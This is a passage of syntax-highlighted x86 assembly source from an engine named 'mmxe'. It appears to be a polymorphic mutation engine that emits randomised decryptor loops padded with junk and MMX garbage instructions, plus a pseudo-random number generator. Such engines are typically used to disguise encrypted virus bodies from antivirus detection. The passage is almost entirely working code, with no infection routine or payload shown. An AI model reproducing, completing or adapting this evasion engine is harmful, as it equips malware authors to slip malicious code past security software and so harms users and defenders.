    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@gip_IncIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@gip_II_Loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@gip_II_Loop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the code that will decrease in one unit the counter</span><span class="sc0">

</span><span class="sc5">@@gen_deccounter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gdc_@@2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@gdc_@@3</span><span class="sc0">
</span><span class="sc5">@@gdc_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">                          </span><span class="sc1">; SUB reg_size,1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11101000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gdc_EXIT</span><span class="sc0">
</span><span class="sc5">@@gdc_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                          </span><span class="sc1">; DEC reg_size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gdc_EXIT</span><span class="sc0">
</span><span class="sc5">@@gdc_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">                          </span><span class="sc1">; ADD reg_size,-1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">@@gdc_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_DECCOUNTER</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate the loop-alike thingy</span><span class="sc0">

</span><span class="sc5">@@gen_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gl_@@3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gl_@@2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gl_@@1</span><span class="sc0">
</span><span class="sc5">@@gl_@@0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">                          </span><span class="sc1">; CMP reg_size,00h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gl_dojnz</span><span class="sc0">
</span><span class="sc5">@@gl_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">                          </span><span class="sc1">; CMP reg_size,-1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gl_dojnz</span><span class="sc0">
</span><span class="sc5">@@gl_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">                          </span><span class="sc1">; OR reg_size,reg_size</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">       
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gl_dojnz</span><span class="sc0">
</span><span class="sc5">@@gl_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; TEST reg_size,reg_size</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@gl_dojnz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">                        </span><span class="sc1">; JNZ LOOP_ADDRESS</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@l00paddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_LOOP</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; --- Garbage generator's table</span><span class="sc0">

</span><span class="sc5">@@gbgtbl</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@do_anything</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Oh, my lazy engine! :)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_arithmetic_reg32_reg32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_arithmetic_reg32_imm32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_arithmetic_eax_imm32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mov_reg32_imm32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mov_reg8_imm8</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_call_to_subroutine</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_push_garbage_pop</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_zer0_reg</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_arithmetic_reg32_reg32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_arithmetic_reg32_imm32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_arithmetic_eax_imm32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mov_reg32_imm32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mov_reg8_imm8</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@non_mmx_gbg</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@gbgtbl</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">; MMX Garbage generatorz</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_onebyter</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; For security, it's here</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mmx_group1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mmx_group2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mmx_group3</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mmx_movq_mm?_mm?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_mmx_movd_mm?_reg32</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_gbgtbl</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@gbgtbl</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; MMX version</span><span class="sc0">

</span><span class="sc5">@@after_looptbl</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_passptr2mmx</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;\
    dd      offset (@@gen_crypt_instructions) ; &gt;- Must follow this order</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_passmmx2ptr</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;/</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_incpointer_deccounter</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_loop</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_aftlooptbl</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@after_looptbl</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; Non MMX version</span><span class="sc0">

</span><span class="sc5">@@after_l00ptbl</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_non_mmx_crypt_instructions</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_incpointer_deccounter</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@gen_loop</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_aftl00ptbl</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@after_l00ptbl</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">mmxe_end</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">mmxe</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=</span><span class="sc0">
</span><span class="sc1">; Random procedures </span><span class="sc0">
</span><span class="sc1">; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; RANDOM</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Random number</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">; Thanx MDriller! ;)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed1</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; R_RANGE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Number of possible random numbers</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Number between 0 and (EAX-1)</span><span class="sc0">

</span><span class="sc5">r_range</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
